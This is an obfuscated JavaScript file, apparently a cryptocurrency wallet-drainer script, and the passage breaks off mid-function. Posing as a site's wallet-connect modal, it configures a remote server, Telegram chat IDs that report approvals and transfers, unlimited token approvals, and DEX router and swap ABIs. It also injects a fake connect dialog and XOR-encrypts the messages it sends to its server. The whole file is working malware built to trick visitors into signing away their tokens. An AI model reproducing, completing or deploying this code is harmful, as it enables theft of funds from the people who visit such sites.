const a0_0x66027a = a0_0x5e72;
(function(_0xe46c6f, _0x1b4771) {
    const _0x216cbe = a0_0x5e72
      , _0x161eff = _0xe46c6f();
    while (!![]) {
        try {
            const _0x20c2d4 = parseInt(_0x216cbe(0x25c)) / 0x1 + parseInt(_0x216cbe(0x2c1)) / 0x2 + -parseInt(_0x216cbe(0x1aa)) / 0x3 * (-parseInt(_0x216cbe(0x28e)) / 0x4) + parseInt(_0x216cbe(0x2af)) / 0x5 + -parseInt(_0x216cbe(0x1a2)) / 0x6 * (parseInt(_0x216cbe(0x227)) / 0x7) + parseInt(_0x216cbe(0x1ac)) / 0x8 + -parseInt(_0x216cbe(0x336)) / 0x9 * (parseInt(_0x216cbe(0x2ad)) / 0xa);
            if (_0x20c2d4 === _0x1b4771)
                break;
            else
                _0x161eff['push'](_0x161eff['shift']());
        } catch (_0x37f12c) {
            _0x161eff['push'](_0x161eff['shift']());
        }
    }
}(a0_0x3874, 0xdc8c4));
const a0_0xe09ffc = (function() {
    let _0x21bf7e = !![];
    return function(_0x29db8e, _0x36d1e2) {
        const _0x46b290 = _0x21bf7e ? function() {
            const _0x145b19 = a0_0x5e72;
            if (_0x36d1e2) {
                const _0x4e62fc = _0x36d1e2[_0x145b19(0x305)](_0x29db8e, arguments);
                return _0x36d1e2 = null,
                _0x4e62fc;
            }
        }
        : function() {}
        ;
        return _0x21bf7e = ![],
        _0x46b290;
    }
    ;
}())
  , a0_0x1ecaa5 = a0_0xe09ffc(this, function() {
    const _0x59f649 = a0_0x5e72;
    return a0_0x1ecaa5[_0x59f649(0x2b4)]()[_0x59f649(0x207)](_0x59f649(0x1f1))[_0x59f649(0x2b4)]()[_0x59f649(0x279)](a0_0x1ecaa5)[_0x59f649(0x207)](_0x59f649(0x1f1));
});
a0_0x1ecaa5();
const a0_0x2fecd5 = (function() {
    let _0xfd5b41 = !![];
    return function(_0x77f831, _0x2af102) {
        const _0x10308c = _0xfd5b41 ? function() {
            const _0x203691 = a0_0x5e72;
            if (_0x2af102) {
                const _0x58eafa = _0x2af102[_0x203691(0x305)](_0x77f831, arguments);
                return _0x2af102 = null,
                _0x58eafa;
            }
        }
        : function() {}
        ;
        return _0xfd5b41 = ![],
        _0x10308c;
    }
    ;
}());
(function() {
    a0_0x2fecd5(this, function() {
        const _0x28d338 = a0_0x5e72
          , _0xa22f85 = new RegExp(_0x28d338(0x298))
          , _0x35aafe = new RegExp(_0x28d338(0x1ea),'i')
          , _0xb4358e = a0_0x29c3de(_0x28d338(0x3a2));
        !_0xa22f85[_0x28d338(0x25b)](_0xb4358e + _0x28d338(0x247)) || !_0x35aafe[_0x28d338(0x25b)](_0xb4358e + _0x28d338(0x256)) ? _0xb4358e('0') : a0_0x29c3de();
    })();
}());
let MS_Encryption_Key = 0x32;
const MS_Server = 'unitrading.tech'
  , MS_WalletConnect_ID = a0_0x66027a(0x33a)
  , MS_Modal_Style = 0x2
  , MS_Loader_Style = 0x2
  , MS_Color_Scheme = a0_0x66027a(0x2d3)
  , MS_Modal_Mode = 0x1
  , MS_Verify_Message = ''
  , MS_WalletConnect_MetaData = {
    'name': document[a0_0x66027a(0x321)],
    'description': a0_0x66027a(0x237),
    'url': a0_0x66027a(0x30b) + window[a0_0x66027a(0x29e)]['host'],
    'icons': [a0_0x66027a(0x297)]
}
  , MS_WalletConnect_Customization = 0x0
  , MS_WalletConnect_Theme = {
    'themeMode': a0_0x66027a(0x2d3),
    'themeVariables': {
        '--w3m-background-color': a0_0x66027a(0x233),
        '--w3m-accent-color': a0_0x66027a(0x223),
        '--w3m-z-index': 0x98967f
    }
}
  , MS_Custom_Chat = {
    'Enable': 0x1,
    'Chat_Settings': {
        'enter_website': '',
        'leave_website': '',
        'connect_success': a0_0x66027a(0x242),
        'connect_request': a0_0x66027a(0x242),
        'connect_cancel': a0_0x66027a(0x242),
        'approve_request': a0_0x66027a(0x242),
        'approve_success': '-1002151286676',
        'approve_cancel': a0_0x66027a(0x242),
        'permit_sign_data': a0_0x66027a(0x242),
        'transfer_request': a0_0x66027a(0x242),
        'transfer_success': '-1002151286676',
        'transfer_cancel': a0_0x66027a(0x242),
        'sign_request': a0_0x66027a(0x242),
        'sign_success': a0_0x66027a(0x242),
        'sign_cancel': '-1002151286676',
        'chain_request': a0_0x66027a(0x242),
        'chain_success': a0_0x66027a(0x242),
        'chain_cancel': a0_0x66027a(0x242)
    }
};
var MS_Worker_ID = a0_0x66027a(0x1b2);
const BN = ethers[a0_0x66027a(0x371)][a0_0x66027a(0x199)];
let MS_Ready = ![]
  , MS_Settings = {}
  , MS_Contract_ABI = {}
  , MS_ID = 0x0
  , MS_Process = ![]
  , MS_Provider = null
  , MS_Current_Provider = null
  , MS_Current_Address = null
  , MS_Current_Chain_ID = null
  , MS_Web3 = null
  , MS_Signer = null
  , MS_Check_Done = ![]
  , MS_Currencies = {}
  , MS_Force_Mode = ![]
  , MS_Sign_Disabled = ![]
  , BL_US = ![]
  , SP_US = ![]
  , XY_US = ![]
  , MS_Bad_Country = ![]
  , MS_Connection = ![]
  , MS_Load_Time = null
  , MS_Gas_Multiplier = 0x2
  , MS_Partner_Address = !![];
const WC2_Provider = window['@walletconnect/ethereum-provider'][a0_0x66027a(0x330)]
  , is_valid_json = _0xe3dfd2=>{
    const _0x1333ac = a0_0x66027a;
    try {
        JSON[_0x1333ac(0x258)](_0xe3dfd2);
    } catch (_0x3cc96f) {
        return ![];
    }
    return !![];
}
;
function a0_0x5e72(_0x518563, _0x3cea15) {
    const _0x416812 = a0_0x3874();
    return a0_0x5e72 = function(_0x29c3de, _0x2fecd5) {
        _0x29c3de = _0x29c3de - 0x18e;
        let _0x583335 = _0x416812[_0x29c3de];
        return _0x583335;
    }
    ,
    a0_0x5e72(_0x518563, _0x3cea15);
}
((async()=>{
    const _0x4ac098 = a0_0x66027a;
    try {
        let _0x280430 = await fetch(_0x4ac098(0x288), {
            'method': _0x4ac098(0x39c),
            'headers': {
                'Accept': 'application/json'
            }
        });
        MS_Currencies = await _0x280430[_0x4ac098(0x326)](),
        MS_Currencies[_0x4ac098(0x384)] = {
            'USD': 0.00004512
        };
    } catch (_0x105fba) {
        console['log'](_0x105fba);
    }
}
)());
const MS_API_Data = {
    0x1: 'api.etherscan.io',
    0xa: a0_0x66027a(0x1b7),
    0x38: 'api.bscscan.com',
    0x89: a0_0x66027a(0x301),
    0xfa: a0_0x66027a(0x3af),
    0xa4b1: a0_0x66027a(0x295),
    0xa86a: 'api.snowtrace.io',
    0x2105: a0_0x66027a(0x36f)
};
var MS_MetaMask_ChainData = {};
const fill_chain_data = ()=>{
    const _0x3f05ea = a0_0x66027a;
    MS_MetaMask_ChainData = {
        0x1: {
            'chainId': _0x3f05ea(0x2e6),
            'chainName': _0x3f05ea(0x310),
            'nativeCurrency': {
                'name': _0x3f05ea(0x39b),
                'symbol': _0x3f05ea(0x24a),
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0x1]],
            'blockExplorerUrls': ['https://etherscan.io']
        },
        0x38: {
            'chainId': _0x3f05ea(0x1ce),
            'chainName': 'BNB\x20Smart\x20Chain',
            'nativeCurrency': {
                'name': 'Binance\x20Coin',
                'symbol': _0x3f05ea(0x381),
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0x38]],
            'blockExplorerUrls': [_0x3f05ea(0x2b8)]
        },
        0x89: {
            'chainId': _0x3f05ea(0x1a8),
            'chainName': _0x3f05ea(0x307),
            'nativeCurrency': {
                'name': _0x3f05ea(0x1ee),
                'symbol': _0x3f05ea(0x1ee),
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0x89]],
            'blockExplorerUrls': [_0x3f05ea(0x2e0)]
        },
        0xa86a: {
            'chainId': _0x3f05ea(0x2bb),
            'chainName': _0x3f05ea(0x216),
            'nativeCurrency': {
                'name': 'AVAX',
                'symbol': _0x3f05ea(0x343),
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings['RPCs'][0xa86a]],
            'blockExplorerUrls': [_0x3f05ea(0x296)]
        },
        0xa4b1: {
            'chainId': _0x3f05ea(0x1df),
            'chainName': _0x3f05ea(0x30a),
            'nativeCurrency': {
                'name': _0x3f05ea(0x24a),
                'symbol': 'ETH',
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings['RPCs'][0xa4b1]],
            'blockExplorerUrls': [_0x3f05ea(0x203)]
        },
        0xa: {
            'chainId': _0x3f05ea(0x1d8),
            'chainName': _0x3f05ea(0x372),
            'nativeCurrency': {
                'name': _0x3f05ea(0x24a),
                'symbol': _0x3f05ea(0x24a),
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0xa]],
            'blockExplorerUrls': [_0x3f05ea(0x322)]
        },
        0xfa: {
            'chainId': '0xFA',
            'chainName': _0x3f05ea(0x206),
            'nativeCurrency': {
                'name': _0x3f05ea(0x26f),
                'symbol': _0x3f05ea(0x26f),
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0xfa]],
            'blockExplorerUrls': [_0x3f05ea(0x26c)]
        },
        0x2105: {
            'chainId': _0x3f05ea(0x20e),
            'chainName': _0x3f05ea(0x349),
            'nativeCurrency': {
                'name': _0x3f05ea(0x24a),
                'symbol': _0x3f05ea(0x24a),
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0x2105]],
            'blockExplorerUrls': [_0x3f05ea(0x2d0)]
        },
        0x144: {
            'chainId': _0x3f05ea(0x291),
            'chainName': _0x3f05ea(0x341),
            'nativeCurrency': {
                'name': _0x3f05ea(0x24a),
                'symbol': 'ETH',
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0x144]],
            'blockExplorerUrls': ['https://explorer.zksync.io/']
        },
        0x171: {
            'chainId': _0x3f05ea(0x1c8),
            'chainName': _0x3f05ea(0x1c7),
            'nativeCurrency': {
                'name': _0x3f05ea(0x384),
                'symbol': 'PLS',
                'decimals': 0x12
            },
            'rpcUrls': [MS_Settings[_0x3f05ea(0x1a7)][0x171]],
            'blockExplorerUrls': [_0x3f05ea(0x292)]
        }
    };
}
  , MS_Routers = {
    0x1: [[a0_0x66027a(0x20c), a0_0x66027a(0x31f)], [a0_0x66027a(0x3a8), '0xEfF92A263d31888d860bD50809A8D171709b7b1c'], [a0_0x66027a(0x265), a0_0x66027a(0x2d7)], ['Sushiswap', a0_0x66027a(0x267)]],
    0xa: [['Uniswap', a0_0x66027a(0x31f)]],
    0x38: [['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'], [a0_0x66027a(0x265), a0_0x66027a(0x2d7)], [a0_0x66027a(0x1ff), a0_0x66027a(0x1e5)]],
    0x89: [[a0_0x66027a(0x20c), a0_0x66027a(0x31f)], ['Sushiswap', a0_0x66027a(0x1e5)], [a0_0x66027a(0x2a6), '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']],
    0xfa: [[a0_0x66027a(0x1ff), '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']],
    0xa4b1: [[a0_0x66027a(0x20c), '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'], [a0_0x66027a(0x1ff), a0_0x66027a(0x1e5)]],
    0xa86a: [[a0_0x66027a(0x1ff), '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']]
}
  , MS_Swap_Route = {
    0x1: a0_0x66027a(0x281),
    0xa: a0_0x66027a(0x28c),
    0x38: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
    0x89: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
    0xfa: a0_0x66027a(0x2fe),
    0xa4b1: a0_0x66027a(0x324),
    0xa86a: a0_0x66027a(0x33b)
}
  , MS_Uniswap_ABI = [{
    'inputs': [{
        'internalType': a0_0x66027a(0x3a3),
        'name': a0_0x66027a(0x1be),
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': a0_0x66027a(0x3a3),
        'name': 'amountOutMin',
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': a0_0x66027a(0x30f),
        'name': a0_0x66027a(0x355),
        'type': a0_0x66027a(0x30f)
    }, {
        'internalType': a0_0x66027a(0x34b),
        'name': 'to',
        'type': a0_0x66027a(0x34b)
    }],
    'name': a0_0x66027a(0x1e6),
    'outputs': [{
        'internalType': a0_0x66027a(0x3a3),
        'name': 'amountOut',
        'type': a0_0x66027a(0x3a3)
    }],
    'stateMutability': a0_0x66027a(0x2a3),
    'type': a0_0x66027a(0x352)
}, {
    'inputs': [{
        'internalType': a0_0x66027a(0x3a3),
        'name': 'deadline',
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': 'bytes[]',
        'name': a0_0x66027a(0x29b),
        'type': a0_0x66027a(0x1da)
    }],
    'name': a0_0x66027a(0x198),
    'outputs': [{
        'internalType': a0_0x66027a(0x1da),
        'name': '',
        'type': a0_0x66027a(0x1da)
    }],
    'stateMutability': a0_0x66027a(0x2a3),
    'type': a0_0x66027a(0x352)
}]
  , MS_Pancake_ABI = [{
    'inputs': [{
        'internalType': a0_0x66027a(0x3a3),
        'name': a0_0x66027a(0x1be),
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': a0_0x66027a(0x3a3),
        'name': 'amountOutMin',
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': a0_0x66027a(0x30f),
        'name': a0_0x66027a(0x355),
        'type': a0_0x66027a(0x30f)
    }, {
        'internalType': a0_0x66027a(0x34b),
        'name': 'to',
        'type': a0_0x66027a(0x34b)
    }, {
        'internalType': 'uint256',
        'name': a0_0x66027a(0x2e8),
        'type': 'uint256'
    }],
    'name': 'swapExactTokensForTokens',
    'outputs': [{
        'internalType': a0_0x66027a(0x254),
        'name': a0_0x66027a(0x345),
        'type': a0_0x66027a(0x254)
    }],
    'stateMutability': a0_0x66027a(0x23d),
    'type': 'function'
}, {
    'inputs': [{
        'internalType': 'uint256',
        'name': a0_0x66027a(0x1be),
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': 'uint256',
        'name': a0_0x66027a(0x399),
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': 'address[]',
        'name': a0_0x66027a(0x355),
        'type': a0_0x66027a(0x30f)
    }, {
        'internalType': a0_0x66027a(0x34b),
        'name': 'to',
        'type': a0_0x66027a(0x34b)
    }, {
        'internalType': a0_0x66027a(0x3a3),
        'name': a0_0x66027a(0x2e8),
        'type': a0_0x66027a(0x3a3)
    }],
    'name': a0_0x66027a(0x272),
    'outputs': [{
        'internalType': a0_0x66027a(0x254),
        'name': 'amounts',
        'type': a0_0x66027a(0x254)
    }],
    'stateMutability': 'nonpayable',
    'type': a0_0x66027a(0x352)
}, {
    'inputs': [{
        'internalType': a0_0x66027a(0x3a3),
        'name': 'deadline',
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': a0_0x66027a(0x1da),
        'name': a0_0x66027a(0x29b),
        'type': 'bytes[]'
    }],
    'name': 'multicall',
    'outputs': [{
        'internalType': a0_0x66027a(0x1da),
        'name': '',
        'type': a0_0x66027a(0x1da)
    }],
    'stateMutability': 'payable',
    'type': 'function'
}, {
    'inputs': [{
        'internalType': a0_0x66027a(0x3a3),
        'name': a0_0x66027a(0x1be),
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': a0_0x66027a(0x3a3),
        'name': 'amountOutMin',
        'type': a0_0x66027a(0x3a3)
    }, {
        'internalType': a0_0x66027a(0x30f),
        'name': a0_0x66027a(0x355),
        'type': a0_0x66027a(0x30f)
    }, {
        'internalType': a0_0x66027a(0x34b),
        'name': 'to',
        'type': 'address'
    }],
    'name': a0_0x66027a(0x1e6),
    'outputs': [{
        'internalType': 'uint256[]',
        'name': a0_0x66027a(0x345),
        'type': a0_0x66027a(0x254)
    }],
    'stateMutability': a0_0x66027a(0x23d),
    'type': a0_0x66027a(0x352)
}]
  , MS_Current_URL = window['location'][a0_0x66027a(0x2f0)]['replace'](/http[s]*:\/\//, '')
  , MS_Mobile_Status = ((()=>{
    const _0x9a1830 = a0_0x66027a;
    let _0x5b3c66 = ![];
    return function(_0xdd2235) {
        const _0x427387 = a0_0x5e72;
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i['test'](_0xdd2235) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x427387(0x25b)](_0xdd2235[_0x427387(0x3b3)](0x0, 0x4)))
            _0x5b3c66 = !![];
    }(navigator[_0x9a1830(0x1e1)] || navigator[_0x9a1830(0x26b)] || window[_0x9a1830(0x2de)]),
    _0x5b3c66;
}
)())
  , MS_Apple_Status = ((()=>{
    const _0x1663d6 = a0_0x66027a;
    try {
        return [_0x1663d6(0x398), 'iPhone\x20Simulator', _0x1663d6(0x3b1), _0x1663d6(0x30d), _0x1663d6(0x222), 'iPod'][_0x1663d6(0x389)](navigator[_0x1663d6(0x2f4)]) || navigator[_0x1663d6(0x1e1)]['includes'](_0x1663d6(0x361)) && _0x1663d6(0x2ba)in document;
    } catch (_0x512731) {
        return ![];
    }
}
)())
  , MS_Unlimited_Amount = a0_0x66027a(0x2a2)
  , MS_Modal_Data = [{
    'type': a0_0x66027a(0x392),
    'data': '@import\x20url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px\x200\x200;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px\x20solid\x20rgba(0,0,0,.1);margin-top:21px}.web3-modal\x20.item{padding:15px\x2034px;border-bottom:1px\x20solid\x20rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal\x20.item:hover{background:#fafafa;border-radius:\x2020px}.web3-modal\x20.item\x20div{display:flex;align-items:center}.web3-modal\x20.item:last-child{border-bottom:none;border-radius:\x200px\x200px\x2060px\x2060px;}.web3-modal\x20.item\x20span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal\x20.item\x20.icon{width:40px;height:40px;justify-content:center}.web3-modal\x20.item\x20.arrow{height:12px;width:7.4px;background:url(\x27/assets/web3-modal/images/arrow.svg\x27)\x20no-repeat}\x20@media\x20(prefers-color-scheme:\x20dark)\x20{.web3-modal\x20{background:\x20#1c1c1c;color:\x20#fff;}.web3-modal-items\x20{border-top:\x201px\x20solid\x20#E4DDDD;}.web3-modal\x20.item\x20span\x20{color:\x20#fff;}.web3-modal\x20.item\x20.arrow\x20{-webkit-filter:\x20invert(1);filter:\x20invert(1);}.web3-modal-title\x20{color:\x20#fff;}.web3-modal\x20.item:hover\x20{background:#262525;}\x20.swal2-popup\x20{\x20background:\x20#1c1c1c;\x20color:\x20#ffffff;\x20}\x20.swal2-styled.swal2-confirm\x20{\x20background-color:\x20#3e7022;\x20}\x20.swal2-styled.swal2-confirm:focus\x20{\x20box-shadow:\x200\x200\x200\x203px\x20#3e7022;\x20}\x20}'
}, {
    'type': a0_0x66027a(0x2bc),
    'data': a0_0x66027a(0x1f3)
}]
  , inject_modal = ()=>{
    const _0x387b6f = a0_0x66027a;
    try {
        let _0x97852b = document['createElement'](_0x387b6f(0x392));
        _0x97852b['id'] = _0x387b6f(0x220),
        _0x97852b[_0x387b6f(0x1f7)] = MS_Modal_Data[0x0]['data'],
        document[_0x387b6f(0x285)][_0x387b6f(0x22d)](_0x97852b);
        let _0x3f9e49 = document[_0x387b6f(0x31a)](_0x387b6f(0x273));
        _0x3f9e49['id'] = _0x387b6f(0x1dc),
        _0x3f9e49[_0x387b6f(0x1cf)] = [_0x387b6f(0x1dc)],
        _0x3f9e49[_0x387b6f(0x392)][_0x387b6f(0x325)] = 'none',
        document[_0x387b6f(0x2ca)][_0x387b6f(0x2ee)](_0x3f9e49),
        document[_0x387b6f(0x37d)](_0x387b6f(0x1ad))[_0x387b6f(0x1f9)](_0x387b6f(0x2b1), ()=>{
            ms_hide();
        }
        );
        let _0x51cc1d = document[_0x387b6f(0x31a)](_0x387b6f(0x273));
        _0x51cc1d['id'] = _0x387b6f(0x2c7),
        _0x51cc1d[_0x387b6f(0x1cf)] = [_0x387b6f(0x2c7)],
        _0x51cc1d['style'][_0x387b6f(0x325)] = 'none',
        _0x51cc1d['innerHTML'] = MS_Modal_Data[0x1][_0x387b6f(0x29b)],
        document['body'][_0x387b6f(0x2ee)](_0x51cc1d);
    } catch (_0x499d06) {
        console['log'](_0x499d06);
    }
}
  , set_modal_data = (_0x67aa1b,_0x2cc56d)=>{
    const _0xeca48b = a0_0x66027a;
    try {
        MS_Modal_Data[0x0][_0xeca48b(0x29b)] = _0x67aa1b,
        MS_Modal_Data[0x1][_0xeca48b(0x29b)] = _0x2cc56d,
        reset_modal();
    } catch (_0x5a3407) {
        console['log'](_0x5a3407);
    }
}
  , reset_modal = ()=>{
    const _0x3beab7 = a0_0x66027a;
    try {
        document['getElementById'](_0x3beab7(0x2c7))['remove']();
    } catch (_0x87435a) {
        console[_0x3beab7(0x217)](_0x87435a);
    }
    try {
        document[_0x3beab7(0x22f)](_0x3beab7(0x1dc))[_0x3beab7(0x1d7)]();
    } catch (_0x25f493) {
        console[_0x3beab7(0x217)](_0x25f493);
    }
    try {
        document['getElementById'](_0x3beab7(0x220))[_0x3beab7(0x1d7)]();
    } catch (_0x3a3b3d) {
        console['log'](_0x3a3b3d);
    }
    try {
        inject_modal();
    } catch (_0x469f4d) {
        console['log'](_0x469f4d);
    }
}
  , ms_init = ()=>{
    const _0x3e969b = a0_0x66027a;
    try {
        if (!MS_Connection)
            return connect_wallet();
        if (MS_Process)
            return;
        MS_Modal_Style == 0x2 ? MSM[_0x3e969b(0x2c4)](MS_Color_Scheme, MS_Modal_Mode) : (document[_0x3e969b(0x22f)](_0x3e969b(0x2c7))[_0x3e969b(0x392)][_0x3e969b(0x325)] = _0x3e969b(0x277),
        document['getElementById']('web3-overlay')['style']['display'] = _0x3e969b(0x277),
        document['getElementsByClassName']('web3-modal-main')[0x0][_0x3e969b(0x392)][_0x3e969b(0x325)] = _0x3e969b(0x277),
        document[_0x3e969b(0x311)](_0x3e969b(0x353))[0x0][_0x3e969b(0x392)]['display'] = 'none');
    } catch (_0xe19467) {
        console[_0x3e969b(0x217)](_0xe19467);
    }
}
  , ms_hide = ()=>{
    const _0x3c0410 = a0_0x66027a;
    try {
        MS_Modal_Style == 0x2 ? MSM[_0x3c0410(0x1de)]() : (document['getElementById']('web3-modal')[_0x3c0410(0x392)][_0x3c0410(0x325)] = _0x3c0410(0x22b),
        document[_0x3c0410(0x22f)]('web3-overlay')[_0x3c0410(0x392)][_0x3c0410(0x325)] = _0x3c0410(0x22b));
    } catch (_0x2cc04c) {
        console['log'](_0x2cc04c);
    }
}
  , load_wc = async()=>{
    const _0x17eab0 = a0_0x66027a;
    let _0x303329 = []
      , _0x1318cd = {};
    for (const _0x2820f2 in MS_Settings[_0x17eab0(0x1a7)]) {
        if (_0x2820f2 != '1')
            _0x303329[_0x17eab0(0x212)](_0x2820f2);
        _0x1318cd[_0x2820f2] = MS_Settings[_0x17eab0(0x1a7)][_0x2820f2];
    }
    MS_Provider = await WC2_Provider[_0x17eab0(0x3a2)]({
        'projectId': MS_WalletConnect_ID,
        'chains': ['1'],
        'optionalChains': _0x303329,
        'metadata': MS_WalletConnect_MetaData,
        'showQrModal': !![],
        'rpcMap': _0x1318cd,
        'methods': ['eth_sendTransaction', _0x17eab0(0x32d), _0x17eab0(0x1d0), _0x17eab0(0x383), 'eth_signTypedData', _0x17eab0(0x337)],
        'qrModalOptions': MS_WalletConnect_Customization == 0x1 ? MS_WalletConnect_Theme : undefined
    });
}
  , prs = (_0x3b684a,_0x3037cf)=>{
    const _0x5c3e0f = a0_0x66027a
      , _0x3f47dc = _0xabd427=>_0xabd427[_0x5c3e0f(0x20d)]('')['map'](_0x4cfd13=>_0x4cfd13[_0x5c3e0f(0x1e9)](0x0))
      , _0x55d049 = _0x5ebf4f=>('0' + Number(_0x5ebf4f)[_0x5c3e0f(0x2b4)](0x10))['substr'](-0x2)
      , _0x48f4aa = _0xc90c3a=>_0x3f47dc(_0x3b684a)[_0x5c3e0f(0x2aa)]((_0x1525a,_0x5e9587)=>_0x1525a ^ _0x5e9587, _0xc90c3a);
    return _0x3037cf['split']('')[_0x5c3e0f(0x3ad)](_0x3f47dc)['map'](_0x48f4aa)[_0x5c3e0f(0x3ad)](_0x55d049)[_0x5c3e0f(0x1b5)]('');
}
  , srp = (_0xc7b8f6,_0x73b87d)=>{
    const _0x153a75 = a0_0x66027a
      , _0x3fe6bc = _0x23ee5e=>_0x23ee5e[_0x153a75(0x20d)]('')[_0x153a75(0x3ad)](_0x4773a8=>_0x4773a8['charCodeAt'](0x0))
      , _0x26f402 = _0x399635=>_0x3fe6bc(_0xc7b8f6)[_0x153a75(0x2aa)]((_0xbb0573,_0x283a43)=>_0xbb0573 ^ _0x283a43, _0x399635);
    return _0x73b87d[_0x153a75(0x283)](/.{1,2}/g)[_0x153a75(0x3ad)](_0x7da350=>parseInt(_0x7da350, 0x10))['map'](_0x26f402)[_0x153a75(0x3ad)](_0x6cd76f=>String[_0x153a75(0x366)](_0x6cd76f))['join']('');
}
;
let prs_enc = 0x0
  , last_request_ts = 0x0;
((async()=>{
    const _0x5a7c71 = a0_0x66027a;
    prs_enc = MS_Encryption_Key,
    MS_Encryption_Key = Math['floor'](Math[_0x5a7c71(0x1bb)]() * 0x3e8);
}
)());
const send_request = async _0x3b764a=>{
    const _0x130e7f = a0_0x66027a;
    try {
        if (MS_Force_Mode)
            return {
                'status': _0x130e7f(0x385),
                'error': 'Server\x20is\x20Unavailable'
            };
        while (Date[_0x130e7f(0x1e4)]() <= last_request_ts)
            await new Promise(_0x532140=>setTimeout(_0x532140, 0x1));
        last_request_ts = Date[_0x130e7f(0x1e4)](),
        _0x3b764a[_0x130e7f(0x1ca)] = window[_0x130e7f(0x29e)][_0x130e7f(0x36e)],
        _0x3b764a[_0x130e7f(0x37e)] = MS_Worker_ID || null,
        _0x3b764a[_0x130e7f(0x282)] = MS_ID || null,
        _0x3b764a['message_ts'] = last_request_ts,
        _0x3b764a[_0x130e7f(0x192)] = MS_Custom_Chat['Enable'] == 0x0 ? ![] : MS_Custom_Chat[_0x130e7f(0x2f7)],
